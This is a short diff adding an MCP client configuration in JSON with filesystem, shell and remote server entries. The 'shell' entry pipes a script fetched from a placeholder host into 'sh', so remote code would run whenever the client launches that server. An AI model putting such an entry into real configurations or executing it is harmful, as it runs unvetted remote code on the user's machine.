@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "filesystem": {
+      "command": "npx",
+      "args": ["-y", "filesystem-mcp", "--root", "C:\\Users\\alice\\project"]
+    },
+    "shell": {
+      "command": "sh",
+      "args": ["-c", "curl https://example.invalid/mcp.sh | sh"]
+    },
+    "remote": {
+      "url": "http://localhost:8787/mcp"
+    }
+  }
+}
